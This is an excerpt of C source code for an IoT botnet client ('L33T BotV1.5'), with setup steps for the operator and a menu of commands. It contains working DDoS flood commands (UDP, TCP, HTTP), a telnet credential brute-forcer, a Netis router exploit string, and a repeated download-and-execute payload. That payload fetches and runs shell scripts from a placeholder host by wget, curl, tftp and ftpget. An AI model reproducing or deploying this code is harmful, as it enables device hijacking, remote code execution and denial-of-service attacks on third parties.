...
Current Owner Count - 1
 ...
 1. Replace all 127.0.0.1 with your vps ip.
 2. Save the file
 3. Upload the L33T-HQ.py and the L33T-HQ-client.c to your server
 4. Go to the directory wherey ou uploaded it
 5. Type python L33T-HQ.py L33T-HQ-client.c <VPS IP>
...
!* BOTKILL--------------------------------------- Kills Inactive Bots

!* LOOPME---------------------------------------- Loops Payload In Bots

!* TELNET ON------------------------------------- Starts Telnet Scanner

!* NETIS ON-------------------------------------- Starts Netis Scanner
...
!* COMBO <IP> <PORT> <TIME>---------------------- STD/JUNK/HOLD Flood

!* UDP <IP> <PORT> <TIME> 32 1024 1-------------- Raw UDP Flood

!* TCP <IP> <PORT> <TIME> 32 all 1024 1---------- TCP Flood

!* HTTP <URL> GET|POST|HEAD <PORT> / <TIME> 1024- L7 Flood

!* L33T-L7 <URL> <PORT> <TIME>------------------- L33T L7 Flood
*/
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
...
#define VERSION "L33T BotV1.5"
#define NETIS "AA\x00\x00AAAA"
unsigned char *hekkertelnet[] = { "127.0.0.1" };
int Server_Botport = 6123;
...
char *hvgsgd = "cd /tmp; wget http://127.0.0.1/Daddy.sh; curl -O http://127.0.0.1/Daddy.sh; chmod 777 Daddy.sh; sh Daddy.sh; tftp 127.0.0.1 -c get tDaddy.sh; chmod 777 tDaddy.sh; sh tDaddy.sh; tftp -r tDaddy2.sh -g 127.0.0.1; chmod 777 tDaddy2.sh; sh tDaddy2.sh; ftpget -v -u anonymous -p anonymous -P 21 127.0.0.1 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Daddy.sh tDaddy.sh tDaddy2.sh ftp1.sh; rm -rf *\r\n";
...
//major improvments done by Jonah
void StartTheLelz() {
int i, res, j;
...
HackerPrint(D1ckSucka, "\x1b[0;31mSuccessfully Bruteforced IP: \x1b[0;33m%s | \x1b[0;31mUsername: \x1b[0;33m%s | \x1b[0;31mPassword: \x1b[0;33m%s\x1b[0m", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
...
sprintf(payload2, "%s cd /tmp; wget http://127.0.0.1/Daddy.sh; curl -O http://127.0.0.1/Daddy.sh; chmod 777 Daddy.sh; sh Daddy.sh; tftp 127.0.0.1 -c get tDaddy.sh; chmod 777 tDaddy.sh; sh tDaddy.sh; tftp -r tDaddy2.sh -g 127.0.0.1; chmod 777 tDaddy2.sh; sh tDaddy2.sh; ftpget -v -u anonymous -p anonymous -P 21 127.0.0.1 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Daddy.sh tDaddy.sh tDaddy2.sh ftp1.sh; rm -rf *\r\n x00", NETIS);
...
int i;
for(i = 0; i < 9; i++){
system("cd /tmp; wget http://127.0.0.1/Daddy.sh; curl -O http://127.0.0.1/Daddy.sh; chmod 777 Daddy.sh; sh Daddy.sh; tftp 127.0.0.1 -c get tDaddy.sh; chmod 777 tDaddy.sh; sh tDaddy.sh; tftp -r tDaddy2.sh -g 127.0.0.1; chmod 777 tDaddy2.sh; sh tDaddy2.sh; ftpget -v -u anonymous -p anonymous -P 21 127.0.0.1 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Daddy.sh tDaddy.sh tDaddy2.sh ftp1.sh; rm -rf *\r\n");
return;
}
sleep(5);
}
...
HackerPrint(D1ckSucka, "[Telnet] SCANNER Starting");
StartTheLelz();
_exit(0);
}
}
...
HackerPrint(D1ckSucka, "\x1b[1;36m L33T Bot Connected \x1b[1;31m| \x1b[1;37mIP: \x1b[1;35m%s \x1b[1;31m| \x1b[1;37mType: \x1b[1;35m%s \x1b[1;31m| \x1b[1;37mVersion: \x1b[1;35m%s", inet_ntoa(ourIP), getBuild(), VERSION);
char commBuf[4096];
int got = 0;
int i = 0;
